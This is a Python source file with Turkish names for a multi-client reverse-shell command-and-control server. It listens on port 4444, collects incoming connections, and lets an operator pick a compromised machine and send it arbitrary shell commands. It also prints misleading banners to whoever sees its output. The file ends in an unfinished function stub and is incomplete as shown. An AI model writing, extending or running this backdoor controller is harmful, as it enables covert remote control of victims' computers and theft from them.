import socket
import sys
import os
import pyautogui
import threading
import time
from  queue import Queue

print("Welcome to your augmented computer .[z*].[z*].[z*]...")
print("Diliniz 'TURKCE' olarak degistirildi...")

IS_SAYISI = 2
IS_NUMARASI = [1,2]
queue = Queue()
BUTUN_BAGLANTILAR = []
BUTUN_ADRESLER = []

def soket_olustur():
     try:
          global host
          global port
          global s
          host = ""
          port = 4444
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


     except socket.error as ilt:
          print("Soket olusturulurken hata olustu : " +str(ilt))



def soketleri_bagla():
     try:
          global host
          global port
          global s
          print("***SOKETLER ADRESLERLE BAGLANTI KURDU*** : "+str(port))

          s.bind((host,port))
          s.listen(5)

     except socket.error as ilt:
          print("___SOKETLER BAGLANTIYI GERCEKLESTIREMEDILER____" + str(ilt)+ "\n" +"Yeniden deneniyor***")



def baglanti_kabul():
     for c in BUTUN_BAGLANTILAR:
          c.close()
     del BUTUN_BAGLANTILAR[:]
     del BUTUN_ADRESLER[:]


     while True:
          try:
               bagl,adres = s.accept()
               s.setblocking(1)

               BUTUN_BAGLANTILAR.append(bagl)
               BUTUN_ADRESLER.append(adres)
               print(adres[0] + " Adresiyle baglanti kuruldu***" )
               break

          except:
               print("___Baglanti Saglanamadi___")



def KOMUTA_KONTROL_BASLAT():
     while True:
          cmd = input("KOMUT> ")

          if cmd == 'list':

               baglantilari_listele()

          elif 'sec' in cmd:
               bagl = hedef_sec(cmd)

               if bagl is not None:
                    komut_gonder(bagl)

          else:
               print("***KOMUT TANILANAMADI***")



def baglantilari_listele():

     sonuclar = ""

     for i,bagl in enumerate(BUTUN_BAGLANTILAR):

          try:
               bagl.send(str.encode(' '))
               bagl.recv(20480)

          except:
               del BUTUN_BAGLANTILAR[i]
               del BUTUN_ADRESLER[i]
               continue
          sonuclar = str(i) + " " +str( BUTUN_BAGLANTILAR[i])+" " +str(BUTUN_ADRESLER[i])+"\n"
     print("******BAGLANTILAR******" + "\n"+sonuclar)


def hedef_sec(cmd):
     try:
          hedef=cmd.replace('sec','')
          hedef=int(hedef)
          bagl = BUTUN_BAGLANTILAR[hedef]
          print("Bu Adresle Baglanti Saglandi : " +str(BUTUN_ADRESLER[hedef]))
          print(str(BUTUN_ADRESLER[hedef])+">", end = "")
          return bagl
     except:
          print("...Gecersiz Giris...")
          return None


def komut_gonder(bagl):
     while True:
          try:
               cmd = input()
               if cmd == 'cikis':
                    break
               if len(str.encode(cmd)) > 0:
                    bagl.send(str.encode(cmd))
                    hedef_bilgisayar = str(bagl.recv(20480),"UTF-8")
                    print(hedef_bilgisayar,end ="")

          except:
               print("HATA ALGILANDI")
               break







def isci_olustur():
    for _ in range(IS_SAYISI):
        t = threading.Thread(target=iss)
        t.daemon = True
        t.start()



def iss():
     while True:
          x = queue.get()
          if x == 1:
               soket_olustur()
               soketleri_bagla()
               baglanti_kabul()

          if x== 2:
               KOMUTA_KONTROL_BASLAT()

          queue.task_done()

def is_olustur():
     for x in IS_NUMARASI:
          queue.put(x)

     queue.join()



isci_olustur()
is_olustur()


def autogui():
    
